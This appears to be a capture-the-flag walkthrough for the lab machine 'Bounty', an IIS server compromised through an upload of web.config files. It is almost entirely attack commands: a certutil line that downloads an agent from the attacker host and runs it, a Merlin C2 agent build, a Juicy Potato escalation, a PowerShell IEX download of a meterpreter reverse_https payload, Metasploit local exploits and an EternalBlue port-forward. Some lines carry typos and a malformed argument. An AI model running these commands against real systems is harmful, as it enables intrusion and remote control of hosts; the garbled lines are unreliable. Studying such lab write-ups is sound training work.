# Bounty

## The first way

* nmap -sC -sV -oA bounty 10.10.10.93
    * HTTP  => 80
        * Micorosft IIS httpd 7.5

* gobuster -h http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x aspx -o gobuster-default-aspx.log
    * upload.aspx

* Test uploading different file types
    * Find you can upload .config files
    * Find you can execute aspx code in web.config files inside commets
    * Upload /opt/shells/web.aspx and test parameters

* Get Ne0nd0g merlin
    * create certificate openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -sub "/CN=ippsec.rocks" -days 7
        * go run cmd/merlinserver/main.go -i 10.10.14.17
    * cd merlinagent
        * GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.10.14.17:443" -o agent.exe main.go

* Modify the webconfig to run certutil
    * cmd /c certutil -urlcache -split -f http://10.10.14.17/agent.exe C:\\Users\\public\\agent.exe && C:\\Users\\public\\agent.exe

* We get our agent connecton to merlin
    * agent list
    * agent interact GUID
    * set sleep 5s

=> Since we have SeImpersonatePerson enabled, we can run juicy potato
* upload potato.exe
* cmd C:\users\public\potato.exe -t * -p c"\users\public\agent.exe -l 9001

## Another way
* python unicorn.py windows/meterpreter/reverse_https 10.10.14.17 9001
* cp powershell_attack.txt unicorn.txt
* msfconsole -r unicorn.rc
* Execute it from shell: "cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17/unicorn.txt')
* Use post/multi/recon/local_exploit_suggester
    * set SESSION 1
    * run
* Migrate to x64 process
    * look for x64 process (ps)
    * migrate process
* Use post/multi/recon/local_exploit_suggester
    * set SESSION 1
    * run
* use an exploit (eg ms10_092_schelevator)
    * use /exploit/windows/local/ms10_092_schelevator
    * set LHOST tun0
    * set SESSION 1
    * run
* Now we have system session

We can use eternal blue with portfowarding to get another shell
* portfwd add -l 445 -r 127.0.0.1 -p 445
